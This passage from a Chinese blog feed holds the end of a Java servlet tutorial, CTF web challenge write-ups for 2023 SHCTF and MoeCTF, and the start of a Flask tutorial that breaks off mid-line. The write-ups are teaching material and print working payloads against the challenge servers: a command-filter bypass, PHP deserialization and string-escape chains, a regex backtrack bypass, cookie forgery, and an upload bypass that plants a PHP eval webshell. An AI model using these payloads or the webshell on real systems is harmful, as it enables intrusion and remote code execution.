title="7.启动简单的实例"></a><strong>7.启动简单的实例</strong></h5><p>在web目录下，创建index.jsp,然后运行服务器</p><img src="/img/9-8/15.png"> <p>成功输出</p><img src="/img/9-8/16.png"> <p>编写Servlet程序，在src目录下创建一个软件包，编写一个java程序测试一下</p><pre class="language-none"><code class="language-none">package com.my;import jakarta.servlet.Servlet;import jakarta.servlet.annotation.WebServlet;import jakarta.servlet.http.HttpServlet;import jakarta.servlet.*;import jakarta.servlet.http.HttpServletRequest;import jakarta.servlet.http.HttpServletResponse;import java.io.IOException;import java.io.PrintWriter;@WebServlet(name = "test")public class Helloserver extends HttpServlet implements Servlet {    @Override    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {    }    @Override    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException, IOException {        response.setContentType("text/html");        PrintWriter out = response.getWriter();        out.println("this is a test!");    }}</code></pre><img src="/img/9-8/17.png"> <p>然后编辑web.xml文件，如下设置</p><img src="/img/9-8/18.png"> <p>然后重新启动服务器访问</p><p>这里的url与我们配置的相对应</p><img src="/img/9-8/19.png"> <p>继续开启javaweb之旅(^-^)</p>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023SHCTF之web的wp</title>
      <link href="/2023/10/03/2023SHCTF%E4%B9%8Bweb%E7%9A%84wp/"/>
      <url>/2023/10/03/2023SHCTF%E4%B9%8Bweb%E7%9A%84wp/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="2023-SHCTF-web-wp-week-1"><a href="#2023-SHCTF-web-wp-week-1" class="headerlink" title="2023 SHCTF web wp[week 1]"></a>2023 SHCTF web wp[week 1]</h1><p>说明：可能稍微啰嗦了亿点,面向新生，放心慢慢食用,</p><p>下面前言可跳过（纯多bb了一下）</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h2><p>首先说web的话是应用层，所以会基本看不到底层的东西(包括c语言/c++)。对于ctf的话，web这块的内容，熟悉HTTP协议（知道计算机质之间是如何传递数据的），html.javaScript（前端语言）是必须要会一点，然后入门级的PHP也要会(比java简单多了)，然后就是Top10漏洞（其中还会涉及数据库mysql），也要知道一些常用的编码和加解密手段(Unicode、md5、base64),会这些后web也算入门了(看到这，要是我，已经当场去世)</p><p>这里再说说why（hihi,装一下）：为什么要搞web 安全，在这互联网的世界，我们能享受各种各样的服务(qq聊天、刷视频)，都离不开web技术，所以web里面也有很多技术（常听的前端和后端），所以就会有许多的漏洞存在，对于企业、学校等等来说web服务器就是面向大伙大门，想要攻入内部系统，首先要拿下web服务器(bushi) ,所以web这块对于整个渗透攻击或者安全防御都重要，企业看重web这块的安全比内网多多了，这里再插一条：2021爆出的史诗级漏洞–log4j2远程代码执行漏洞(CVE-2021-44228)</p><p>从易到难（前三个不好排），题解可能会不唯一，拿到flag就行，下面题目若是看不懂题解，也不要紧，把涉及的知识点记下来，以后慢慢学(hhhh)</p><p><strong>前几题不一定要有编程基础！</strong></p><h2 id="WEEK1-登录就给flag"><a href="#WEEK1-登录就给flag" class="headerlink" title="[WEEK1]登录就给flag"></a>[WEEK1]登录就给flag</h2><p><strong>前置知识</strong>：弱口令、暴力破解、（http协议、 抓包）</p><p>先bb一下(这里主打一个实操):</p><p>什么是弱口令：就是很容易会被猜到的口令(不一定是密码)，比如说常见的弱口令密码：123456、admin、password、000000...</p><p>什么是暴力破解：简称爆破，大白话就是一个一个去试，当然一般不会是人工，拿着工具或者编程语言脚本去跑。</p><p>拿什么去试？：一般会有人把常见的密码或者用户名等测试语句存放在一个文本文件里面，这个通常叫作字典，github上有开源的字典（一搜便是），当然 也可以自己搜集制作自己的字典</p><p>这里再插一条：admin （后台）管理员的意思，后台管理员是网站中能够控制管理内容的角色(如别人提交发布文章、视频、监控网站等等)，有最高权限，一般就是网站登录的特殊用户（有些可能会有后台管理系统），在现实中和ctf中，无疑管理员的账号可能会是admin（有时候密码也是） 所以第一测试的用户名就是admin</p><p>回到题目</p><p>这题就是登录时有弱口令漏洞</p><p>进入登录页面</p><img src="/img/10-3/5.png"><p>上面bb了，这里username用户名直接测试admin</p><p>至于密码，开头可以首测几个弱口令 ，运气好就测出来了（hhh）、本题弱口令密码–password（我是没那运气），登录成功后就有flag</p><img src="/img/10-3/6.png"><p>下面进入常规的爆破密码解法（没运气的看这边）</p><p>这里我用的工具是Burp Suite  (web和渗透必备)，没安的kali上面自带，安装需要java环境（burp安装稍微复杂，但必备）</p><p>使用burp抓包送至Intruder模块进行暴力破解(b站上有教程)，并对我们输入的密码部分进行标记(标记后前后都会有$)</p><img src="/img/10-3/7.png"><p>设置payload(不想解释了)，点load加载字典文件（自己网上搜），若右边有内容说明加载成功，说明加载成功，最后点击Start attack开始攻击</p><img src="/img/10-3/8.png"><p>等他跑完，最后可以根据Status code（状态码）和Length（返回长度）找出那与众不同的那条，发现password就是密码，拿去登录拿flag</p><img src="/img/10-3/9.png"><h2 id="WEEK1-生成你的邀请函吧"><a href="#WEEK1-生成你的邀请函吧" class="headerlink" title="[WEEK1]生成你的邀请函吧~"></a>[WEEK1]生成你的邀请函吧~</h2><p>前置知识：http协议、json*</p><p>这个题，题目描述就告诉我们该怎么做了</p><img src="/img/10-3/10.png"><p>根据他的描述请求就行。请求接口为generate_invitation</p><p>实体类型：application/json</p><p>请求方式为POST、请求实体就是上面的Body，这里其实就是一个标准的请求接口，传递json数据，获得一张图片</p><p>下面分别展示插件Ha</p><p>ckbar和Burp Suite抓包改包(选一个有的就行)</p><p>Hackbar</p><p>1.设置URL    2.设置POST请求  3.设置类型为json数据         4.加上json数据</p><img src="/img/10-3/11.png"><p>Burp Suite</p><p>抓包，然后改成这样，再放包</p><img src="/img/10-3/12.png"><p>最后打开图片，flag就在下面</p><img src="/img/10-3/13.png"><h2 id="WEEK1-飞机大战"><a href="#WEEK1-飞机大战" class="headerlink" title="[WEEK1]飞机大战"></a>[WEEK1]飞机大战</h2><p><strong>前置知识</strong>：html、javascript、unicode编码、base64</p><p>右键查看源代码 ，找到引用的js文件，点击查看js文件源码</p><img src="/img/10-3/1.png"><p>看到这个函数，应该是游戏赢了后执行的，里面有一窜奇怪的字符</p><img src="/img/10-3/2.png"><p>这串字符其实就是unicode编码，十有八九就是flag,将其进行解码</p><img src="/img/10-3/3.png"><p>拿到：ZmxhZ3s0MzAxMTk1ZS05MWE5LTQ0Y2ItYjk4NC0wMjQ4ZGQ3MWRhYTB9</p><p>好家伙，搁这玩套娃(出题人出来挨打)，这层实际是base64加密，这些加解密，网上都有在线的</p><p>再解base64，得到flag</p><p><img src="/img/10-3/4.png"> &gt;</p><p><strong>接下来的题目需要会编程语言（PHP）、漏洞基础！</strong></p><p>PHP是世界上最好的语言…….十分合理（hh),比java简单多了(虽然现在java是主流，不建议入门就学)</p><h2 id="WEEK1-babyRCE"><a href="#WEEK1-babyRCE" class="headerlink" title="[WEEK1]babyRCE"></a>[WEEK1]babyRCE</h2><p><strong>前置知识:</strong>  http协议、 php入门，Linux系统命令(会查看编辑文件、熟悉目录结构)，  代码执行漏洞(RCE)以及相关绕过和防御、正则表达式</p><p>首先不得不说现在的服务器（古老的除外）。都基本是Linux，所以涉及这个漏洞的时候就要熟悉Linux指令</p><p>这题纯粹的RCE，这题解法应该有很多，说其中一种</p><img src="/img/10-3/14.png"><p>代码解析：首先获取GET传参rce，然后对我们传的参数进行了正则过滤、没有过滤字符才会把我们传的参数进行系统命令执行</p><p>它过滤了cat 、more、less、ead、tac、tail、nl、od、vi、vim、sort、flag|、;|0-9、*、`、%、&gt;、&lt;、’、” 还有空格</p><p>首先ls查看当前web目录下的文件</p><img src="/img/10-3/15.png"><p>这些就不能直接出现我们输入的参数里面。空格这里用%09代替(tab键的url编码)</p><p>cat和flag 再其中加入\就行 ,?rce=c\at%09./f\lag.php查看flag.php文件</p><img src="/img/10-3/16.png"><p>看不到内容，查看源代码</p><img src="/img/10-3/17.png"><p>好好好，被出题人给骗了（出来受打）看看根目录有没有flag</p><img src="/img/10-3/18.png"><p><strong>到后面应该算得上中等题了，这里知识储备就多了,好好好，这是新生赛</strong></p><h2 id="WEEK1-ez-serialize"><a href="#WEEK1-ez-serialize" class="headerlink" title="[WEEK1]ez_serialize"></a>[WEEK1]ez_serialize</h2><p><strong>前置知识</strong>：PHP类与对象、PHP魔术方法、PHP反序列化漏洞、POP链、文件包含漏洞、php伪协议</p><p>PHP反序列化的题主打一个代码审计（看代码），好好好，代码多的时候当场去世</p><p>,先马代码，序列化和反序列化不多说了,主打套娃反复横跳</p><img src="/img/10-3/19.png"><p>这里代码审计和魔术方法不多说了，说下pop利用链</p><p>1.最外层是B类的对象，触发__wakeup方法,</p><p>2.q属性是C类的实例对象,触发__toString方法</p><p>3.C中属性var是D类的实例对象，触发__get方法</p><p>4.D中的属性p是A类的实例对象，触发__inovke方法</p><p>5.A中属性var_1是我们要包含的文件；最后利用文件包含漏洞</p><p>这里利用php://filter和文件包含漏洞来读取flag.php文件</p><p>上序列化代码</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpclass A{    public $var_1;}class B{    public $q;}class C{    public $var;    public $z;}class D{    public $p;}$b = new B();$c = new C();$d = new D();$a = new A();$a-&gt;var_1 = "php://filter/read=convert.base64-encode/resource=flag.php";$d-&gt;p = $a;$c-&gt;z = $d;$b-&gt;q = $c;echo serialize($b);</code></pre><p>执行上面代码得到序列化字符串</p><pre class="language-reStructuredText" data-language="reStructuredText"><code class="language-reStructuredText">O:1:"B":1:{s:1:"q";O:1:"C":2:{s:3:"var";N;s:1:"z";O:1:"D":1:{s:1:"p";O:1:"A":1:{s:5:"var_1";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}}}}</code></pre><p>得到文件内容, PD9waHANCiRmbGFnID0gImZsYWd7NzZmZmExNWYtY2YxOS00ZTMwLTk3ZDEtNTdlMmQ5Yjg3MDJlfSI7DQo=    进行base64解密得到flag    </p><p>flag{76ffa15f-cf19-4e30-97d1-57e2d9b8702e}</p><img src="/img/10-3/20.png"><h2 id="WEEK1-1zzphp"><a href="#WEEK1-1zzphp" class="headerlink" title="[WEEK1]1zzphp"></a>[WEEK1]1zzphp</h2><p><strong>前置知识</strong>：正则表达式、php代码审计、php正则函数绕过、(python)</p><p>这里顺便提一下PHP的弱类型比较，可以学习学习</p><p>这题真不一定能get到（出题人出来挨打），遇到的才有思路（我也学到了）</p><p>首先代码审计，主要分为两部分</p><img src="/img/10-3/21.png"><p>第一部分：正则过滤了num中的数字，但没有数字无法进入下一部分</p><p>这里给num传个数组(?num[]=1)就行，preg_match 遇到数组会返回null</p><p>第二部分：c_ode需要2023SHCTF ，但又不能出现SHCTF,</p><p>这里只能绕过preg_match函数</p><p>需要补充知识：</p><p>看看大佬p神的文章：<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PRCE回溯攻击</a></p><p>总之一句话：超长字符串引发php安全机制，从而绕过preg_match 函数</p><p>上python脚本自动构造超长字符(好好好，这题c_ode长度达到了1000000的级别才行)</p><pre class="language-python" data-language="python"><code class="language-python">import requests#pip 安装一下库#改成自己题目的urlurl="http://112.6.51.212:30932/"data={    "c_ode":"s"*1000000+"2023SHCTF"}res=requests.post(url+"?num[]=1",data).textprint(res)</code></pre><p>运行代码，最后得到flag</p><img src="/img/10-3/22.png"><h2 id="WEEK1-ezphp"><a href="#WEEK1-ezphp" class="headerlink" title="[WEEK1]ezphp"></a>[WEEK1]ezphp</h2><p><strong>前置知识</strong>：php、代码执行漏洞、phpinfo、正则表达式、preg_replace代码执行</p><p>好好好，做到这个题，原来我也是新生(太菜了，呜呜~)</p><p>上题目</p><img src="/img/10-3/23.png"><p>前面正则过滤了好多东西，暂且不管，这题只要出phpinfo页面就行了</p><p>关键是圈出部分</p><p>这个我见的少(可能是第二次见)，直接码文章：</p><p><a href="https://mochazz.github.io/2018/08/13/%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6preg_replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">深入研究preg_replace与代码执行 | Mochazz’s blog</a> </p><p>preg_replace这个函数原本是利用正则表达式替换符合条件的字符串，但是这个函数有一个功能——<code>可执行命令</code>。这个函数的第一个参数是正则表达式，按照PHP的格式，表达式在两个“/”之间。如果我们在这个表达式的末尾加上“e”，那么这个函数的第二个参数就会被当作代码执行。 </p><p>总之，/e模式下正则表达式代码执行（这里可以用在php的一句话木马中）</p><p>解析题目代码：</p><p>pattern为匹配模式，code为匹配字符串，\1 其实是一个引用，指向code参数</p><p>上payload</p><img src="/img/10-3/24.png"><p>code为格式{${要执行的代码}}（官方payload就是这样的，我也没深入研究，先拿来用） 只要匹配成功就能执行code代码，所以pattern为（.*），意为匹配所有。</p><p>匹配成功后执行代码，显示phpinfo页面</p><p>再ctrl+f 搜索flag就能找到flag</p><img src="/img/10-3/25.png"><h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>新生赛，也大概体会了一下ctf，不仅局限于ctf,学web和二进制等方向还是看自己兴趣，凭着ctf也可以研究好web安全(前期)</p><p>web方向确实面向现实一点，是渗透测试的基础，web安全方向知识的也会常常出现在绝大多安全岗位的面试题</p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> ctf入门 </tag>
            
            <tag> 新生赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023MoeCTF之web的wp</title>
      <link href="/2023/09/12/2023MoeCTF%E4%B9%8Bweb%E7%9A%84wp/"/>
      <url>/2023/09/12/2023MoeCTF%E4%B9%8Bweb%E7%9A%84wp/</url>
      
        <content type="html"><![CDATA[<h1 id="2023-MoeCTF-WEB-wp"><a href="#2023-MoeCTF-WEB-wp" class="headerlink" title="[2023 MoeCTF] WEB wp"></a>[2023 MoeCTF] WEB wp</h1><p>环境有问题，我开始还能用自己ip访问，后面突然不行了，这导致不能抓取本地的包，没关系照样做(^-^)</p><h1 id="http"><a href="#http" class="headerlink" title="http"></a>http</h1><p>签到题一</p><img src="\img\9-12\7.png" height="300px"><p>第一眼还没看懂，这应该满足他的条件即可拿到flag</p><p>1和2,分别get和post传参，</p><p>3.修改Cookie为character为admin</p><p>4.添加字段X-Forward-For: 127.0.0.1</p><p>5.修改User-Agent内容为MoeBrowser</p><img src="\img\9-12\8.png"><h1 id="Web入门指北"><a href="#Web入门指北" class="headerlink" title="Web入门指北"></a>Web入门指北</h1><p>签到题二</p><p>解密：</p><pre class="language-none"><code class="language-none">666c61673d6257396c5933526d6533637a62454e7662575666564739666257396c513152475831637959 6c396a61474673624756755a3055684958303 </code></pre><p>对密码不是很熟悉，但对这里应该只能是md5、base64、16进制</p><p>一看只能是16进制</p><p>进行16进制解码：<code>flag=bW9lY3Rme3czbENvbWVfVG9fbW9lQ1RGX1cyYl9jaGFsbGVuZ0UhIX0</code></p><p>这里面还加了一层base64,</p><p>进行解码：<code>moectf{w3lCome_To_moeCTF_W2b_challengE!!}</code></p><h1 id="彼岸的flag"><a href="#彼岸的flag" class="headerlink" title="彼岸的flag"></a>彼岸的flag</h1><p>签到题三</p><p>查看源代码搜索注释(&lt;!–)就行（藏得靠后…）</p><img src="\img\9-12\9.png"><h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><p>根据他给出的api进行注册和登录，然后获取flag</p><img src="\img\9-12\10.png" height="300px"><p>提示我们不是admin用户，拿到cookie,</p><p>进行base64解码，得到<code>{"username": "yyj", "password": "123456", "role": "user"}</code></p><p>修改为<code>{"username": "admin", "password": "123456", "role": "admin"}</code></p><p>再进行base64编码得到eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwYXNzd29yZCI6ICIxMjM0NTYiLCAicm9sZSI6ICJhZG1pbiJ9</p><p>替换Cookie中的token值，再访问flag，得到flag</p><pre class="language-none"><code class="language-none">{"error": "ok", "data": {"flag": "moectf{cooKi3_is_d3licious_MA9iVff90SSJ!!M6Mrfu9ifxi9i!JGofMJ36D9cPMxro}"}}</code></pre><h1 id="gas-gas-gas"><a href="#gas-gas-gas" class="headerlink" title="gas!gas!gas!"></a>gas!gas!gas!</h1><p>多看了几眼，根据他给的说明，要正确提交正确的表单，</p><img src="/img/9-12/11.png"><p>然后根据规则，编写python脚本，注意一下Cookie(session)问题，开始还没注意到</p><pre class="language-python" data-language="python"><code class="language-python">import requestsfrom bs4 import BeautifulSoup#默认post参数data={    "driver": "yyj","steering_control": '0',"throttle": '2'}#urlurl='http://localhost:60713'#默认cookiecookies={    'session': '.eJxtjdsKAiEURf_lPEuoo8fLr2TINKM0UQ6YJxqif0-GHntZsC_s_YZpLa2ut3hZSgMPgXSWOZDjeghkMKtA1qopUM68E6XrvjYD75Tu3OnkuNMEUsni3hTAYK7LM9W-uW3XLkt6tfh7A3_kTJ4Y1JXKDJ4zeLSxttiWewIv0CktLBp7QMlxsIrB30QJ8_kCkKs6Qw.ZQBNlg.s5GIQKXa8JudrZi3dGeeS_T699Q'}#精确爬虫，也可以不搞def result(res):    html=BeautifulSoup(res,'lxml')    fl=html.body.div.string    if(fl):        print('请求结果：',fl)    else:        print('请求结果：',html.body.div)    return resdef setdata(res,data):    if '向右' in res:        data['steering_control']='-1'    elif '向左' in res:        data['steering_control']='1'    else:        print('其他')        data['steering_control']='0'    if '太小' in res:        data['throttle']='0'    elif '太大' in res:        data['throttle']='2'    else:        print('其他')        data['throttle']='1'    return datafor i in range(20):    print('第'+str(i)+'次')    print('请求数据：',data)    res=requests.post(url=url,data=data,cookies=cookies)    fl=result(res.text)    if(res.cookies):        cookies=requests.utils.dict_from_cookiejar(res.cookies)    data=setdata(fl,data=data)    if 'moectf' in res.text:        break    print()</code></pre><p>跑一下就可以出flag</p><img src="/img/9-12/12.png"><h1 id="moe图床"><a href="#moe图床" class="headerlink" title="moe图床"></a>moe图床</h1><p>经典文件上传处理</p><p>首页查看js源码，查看ajex，发现upload.php</p><img src="/img/9-12/15.png"><p>进行访问，得到源码</p><img src="/img/9-12/16.png"><p>对上传文件检查了文件类型，和文件名，关键$fileNameParts&nbsp;=&nbsp;explode(‘.’,&nbsp;$fileName); 将文件名变为数组后，$secondSegment&nbsp;=&nbsp;$fileNameParts[1]; </p><p>固定取下标为1</p><p>绕过：抓包，修改文件类型为image/png,修改文件名为test.png.php</p><p>这里我没抓包，我用的python脚本</p><pre class="language-python" data-language="python"><code class="language-python">import requestsurl ='http://localhost:55163/upload.php'file={    'file':('test.png.php' #文件名            ,open("D:/phpstudy_pro/WWW/upload- picture/link.php",'rb')            ,'image/png' #文件类型            )}res=requests.post(url,files=file)print(res.text)</code></pre><p>上传一句话木马成功！</p><img src="/img/9-12/17.png"><p>这里附上一句话木马（不看就好-*-*）</p><pre class="language-php" data-language="php"><code class="language-php">89504E47&lt;?php echo phpinfo();@eval($_POST['bb']); ?&gt;</code></pre><p>访问验证一下</p><img src="/img/9-12/18.png"><p>用蚁剑一连，flag就在根目录</p><img src="/img/9-12/19.png"><h1 id="meo图床"><a href="#meo图床" class="headerlink" title="meo图床"></a>meo图床</h1><p>文件上传先试下水，上传成功</p><img src="\img\9-12\1.png"><p>查看一下图片</p><img src="\img\9-12\2.png"><p>看这url,应该是用着文件包含，再试试，尝试包含/etc/passwd</p><img src="\img\9-12\3.png"><p>这里只能显示图片，burp抓下包，这里我改成用python脚本(也一样)</p><img src="\img\9-12\4.png"><p>ok,成功包含,试下flag</p><img src="\img\9-12\5.png"><p>居然是个提示(…….),访问一下Fl3g_n0t_Here_dont_peek!!!!!.php</p><p>这里发现是PHP的md5弱比较,不多说了</p><p>最终payload</p><pre class="language-text" data-language="text"><code class="language-text">http://localhost:55371/Fl3g_n0t_Here_dont_peek!!!!!.php?param1=s878926199a&amp;param2=s214587387a</code></pre><img src="\img\9-12\6.png"><h1 id="夺命十三枪"><a href="#夺命十三枪" class="headerlink" title="夺命十三枪"></a>夺命十三枪</h1><p>典型的PHP反序列化中的字符串逃逸题目</p><p>访问它包含的文件Hanxin.exe.php ，得到源码，</p><p>对两个页面进行代码审计，发现，关键是反序列化后Spear_Owner 属性为MaoLei 就可获得flag</p><p>而我们可以通过get传参给Chant 属性赋值，恰巧他对序列化的字符串进行了如下的字符串替换</p><img src="/img/9-12/13.png"><p>所以先写出要逃逸的字符串：</p><pre class="language-none"><code class="language-none">";s:11:"Spear_Owner";s:6:"MaoLei";}</code></pre><p>然后要逃逸的字符总数为35个，</p><p>发现：di_qi_qiang 替换后增加5个字符，di_jiu_qiang 替换后增加20个字符</p><p>因此加入di_qi_qiang 3个，di_jiu_qiang个；序列化后替换后会恰好增加35个字符，然后后面的字符就能逃逸出去，进行反序列化到}结束，就此覆盖了他构造函数对Spear_Owner 赋值，拿到flag</p><p>最终payload</p><pre class="language-none"><code class="language-none">http://localhost:53192/?chant=di_qi_qiangdi_qi_qiangdi_qi_qiangdi_jiu_qiang";s:11:"Spear_Owner";s:6:"MaoLei";}</code></pre><img src="/img/9-12/14.png">]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>入门flask框架</title>
      <link href="/2023/08/28/%E5%85%A5%E9%97%A8flask%E6%A1%86%E6%9E%B6/"/>
      <url>/2023/08/28/%E5%85%A5%E9%97%A8flask%E6%A1%86%E6%9E%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="入门Flask框架"><a href="#入门Flask框架" class="headerlink" title="入门Flask框架"></a>入门Flask框架</h1><p>Flask是一个用Python语言编写的轻量级Web应用框架，它采用WSGI工具箱和Jinja2模板引擎，该框架使用简单的核心和扩展，没有默认的数据库和窗体验证工具，被称为“微框架”。</p><p><strong>核心</strong></p><p>WSGI工具箱采用Werkzeug(路由模块)，模板引擎采用jinja2</p><p><strong>特点</strong></p><p>轻量级，只提供一些核心操作 </p><h2 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a><strong>相关知识</strong></h2><p><strong>框架</strong>：Web框架是一种用于开发Web应用的软件架构，它提供了一些通用的功能和组件，使得开发者可以更方便、高效、安全地构建Web应用。</p><p><strong>模板引擎</strong>（Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。</p><p>模板引擎的核心原理就是两个字：<strong>替换</strong>。将预先定义的标签字符替换为指定的业务数据，或者根据某种定义好的流程进行输出</p><p>模板：模板是一种文件，它可以包含固定的和动态的内容。动态的内容通常是用一种特定的语法来表示的，</p><p>**路由(route)**：简单来说，路由就是URL到视图函数的映射。当访问某个URL时，就会执行对应的函数</p><p>如：/usersu        -&gt;  getAllUsers()</p><p> router 可以理解为一个容器，或者说一种机制，它管理了一组 route。简单来说，route 只是进行了URL和函数的映射，而在当接收到一个URL之后，去路由映射表中查找相应的函数，这个过程是由 router 来处理的。</p><h2 id="构成"><a href="#构成" class="headerlink" title="构成"></a>构成</h2><pre class="language-none"><code class="language-none">from flask import Flask        #1.导入app=Flask(__name__)            #2.创建Flask对象，管理全局路由，配置信息@app.route('/')            #3.设置装饰器，将路由映射到视图函数def index():                #4.定义触发函数    return 'Hello world'if __name__=='__main__':    app.run()                #5.Flask对象调用run方法,启动服务器</code></pre><p>目录结构：app.py主程序,templates存放模板文件，static存放静态文件</p><p><strong>装饰器</strong></p><p>装饰器的一般语法结构如下：</p><pre class="language-none"><code class="language-none">def decorator(func): # 定义装饰器函数，接收一个函数作为参数    def wrapper(*args, kwargs):         # 定义包装函数，接收任意数量的参数         # 在这里可以添加一些代码，在原函数执行前后执行         return func(*args, kwargs)      # 调用原函数，并返回结果    return wrapper # 返回包装函数</code></pre><p>要使用装饰器，可以在要被装饰的函数上方使用@符号，后面跟着装饰器的名称。</p><pre class="language-none"><code class="language-none">@decorator # 使用@符号应用装饰器def my_func(): # 定义要被装饰的函数pass # 函数体</code></pre><p>这相当于执行了以下代码：</p><pre class="language-none"><code class="language-none">def my_func():    passmy_func = decorator(my_func) # 将my_func作为参数传给decorator，并将返回值赋给my_func</code></pre><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><h4 id="flask对象初始化参数"><a href="#flask对象初始化参数" class="headerlink" title="flask对象初始化参数"></a>flask对象初始化参数</h4><p>Flask(import_name,static_url_path,static_floder,template_folder)</p><p>import_name(必要):</p><p>工程(主模块)目录名称，__name__当前模块(目录)名称，可决定访问静态文件的路径</p><p>static_url_path</p><p>静态文件访问路径，默认为/+static_floder</p><p>static_floder</p><p>静态文件存储的文件夹名称，默认为’stastic’</p><p>template_folder</p><p>模板文件存储的文件夹名称，默认为’templates’</p><h4 id="web应用程序配置参数"><a href="#web应用程序配置参数" class="headerlink" title="web应用程序配置参数"></a>web应用程序配置参数</h4><p>作用：集中管理项目中所有的配置</p><p>flask将配置信息放入了app.config属性之中，该属性可以按照字典类型进行操作</p><h5 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h5><p>1.从配置对象中加载</p><p>app.config.from_object(配置对象)，如</p><pre class="language-none"><code class="language-none">class DefaultConfig(object)：          #设置配置类    SECRET_KEY='acdvdasd'    app.config.from_object(DefaultConfig)</code></pre><p>2.从配置文件中加载</p><p>app.config.from_pyfile(‘文件名’)</p><p>3.从环境变量中加载</p><p>app.config.from_envvar(‘环境变量名’)</p><p>app.run(host=”0.0.0.0”,port=5000,debug=True,threaded=True)</p><p>debug调试模式</p><p>1.程序修改后可以自动重启</p><p>2.服务器出现错误能够返回给前端</p><p>threaded–是否开启多线程</p><p>终端启动–flask run -h 0.0.0.0 -p 5000</p><p>读取环境变量FLASK_APP的值作为启动文件</p><p>export FLASK_APP=app </p><h2 id="路由与蓝图"><a href="#路由与蓝图" class="headerlink" title="路由与蓝图"></a>路由与蓝图</h2><h5 id="查看全部路由"><a href="#查看全部路由" class="headerlink" title="查看全部路由"></a>查看全部路由</h5><p>1.命令行</p><p>flask routes</p><p>2.程序中查看</p><p>app.url_map</p><p>app.url_map.iter_rules()–返回列表</p><h5 id="指定请求方式"><a href="#指定请求方式" class="headerlink" title="指定请求方式"></a>指定请求方式</h5><p>默认支持的请求方式：GET、OPTION、HEAD</p><p>app.route(‘url’,methods=list)</p><h3 id="蓝图"><a href="#蓝图" class="headerlink" title="蓝图"></a>蓝图</h3><p>一个存储一组视图方法的容器对象，具有以下特d</p><ul><li>一个应用可以具有多个Blueprint</li><li>可以将一个Blueprint注册到任何一个未使用的URL下</li><li>蓝图可以单独具有自己的模板、静态文件、或其他通用操作方法，并不是必须实现应用视图和函数</li><li>一个应用初始化时，就应该注册需要使用Blueprint，蓝图并不是一个完整应用，必须要注册到某一应用中</li></ul><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>1.创建蓝图对象</p><pre class="language-none"><code class="language-none">from flask import Blueprintuser_bp=Blueprint('user',__name__)</code></pre><p>2.在这个蓝图对象上进行操作，注册路由，指定静态文件，注册模板过滤器</p><pre class="language-none"><code class="language-none">@user_bp.route('/')def user_profile():    return 'usee_profile'</code></pre><p>3.在应用对象上注册蓝图对象</p><pre class="language-none"><code class="language-none">app.register_blueprint(user_bp)</code></pre><h2 id="请求与响应"><a href="#请求与响应" class="headerlink" title="请求与响应"></a>请求与响应</h2><p>转化器，获取动态url参数</p><p><strong>获取路径参数</strong></p><p>route(‘/user/<a href="converter:id">converter:id</a>‘)</p><p>converter–数据类型：string（默认）、int、flaot、path、uuid、any</p><p>url_for()–根据函数获取url</p><h5 id="获取请求数据"><a href="#获取请求数据" class="headerlink" title="获取请求数据"></a>获取请求数据</h5><p>通过request对象获取</p><table><thead><tr><th>属性</th><th>说明</th><th>类型</th></tr></thead><tbody><tr><td>data</td><td>记录请求数据，并转化为字符串</td><td>*</td></tr><tr><td>form</td><td>记录请求中的表单数据</td><td>MultiDict</td></tr><tr><td>args</td><td>记录查询参数</td><td>MultiDict</td></tr><tr><td>cookies</td><td>记录请求中cookie信息</td><td>Dict</td></tr><tr><td>headers</td><td>记录请求头信息</td><td>EnvironHeaders</td></tr><tr><td>method</td><td>记录请求的HTTP方法</td><td>GET/POST</td></tr><tr><td>url</td><td>记录URL地址</td><td>string</td></tr><tr><td>files</td><td>记录请求上传的文件</td><td>*</td></tr></tbody></table><p>示例</p><pre class="language-none"><code class="language-none">id=request.args.get('id')</code></pre><h3 id="处理响应"><a href="#处理响应" class="headerlink" title="处理响应"></a>处理响应</h3><h5 id="1-模板渲染"><a href="#1-模板渲染" class="headerlink" title="1.模板渲染"></a>1.模板渲染</h5><p>使用render_template方法渲染模板并返回</p><p><strong>导入</strong></p><pre class="language-none"><code class="language-none">from flask import render_template</code></pre><p><strong>使用</strong></p><pre class="language-none"><code class="language-none">return render_template('index.html',mystr(模板内变量名)=strval(程序中的变量),...)</code></pre><p>参数已经封装成字典，在字典前添加**,如**data</p><p>render_template_string()将字符串当作模板文件内容进行渲染</p><h5 id="2-重定向"><a href="#2-重定向" class="headerlink" title="2.重定向"></a>2.重定向</h5><pre class="language-none"><code class="language-none">from flask import redirect...    return redirect(url)</code></pre><h5 id="3-返回JSON"><a href="#3-返回JSON" class="headerlink" title="3.返回JSON"></a>3.返回JSON</h5><pre class="language-none"><code class="language-none">from flask import jsonify    return jsonify(json_dict)</code></pre><p><strong>自定义状态码和响应头</strong></p><p>make_respone(其中一种方式)</p><pre class="language-none"><code class="language-none">resp=make_respone('test')resp.headers['Itcast']='Test'resp.status="404  not found"return resp</code></pre><h3 id="cookie和session"><a href="#cookie和session" class="headerlink" title="cookie和session"></a>cookie和session</h3><p>response.setcookie( 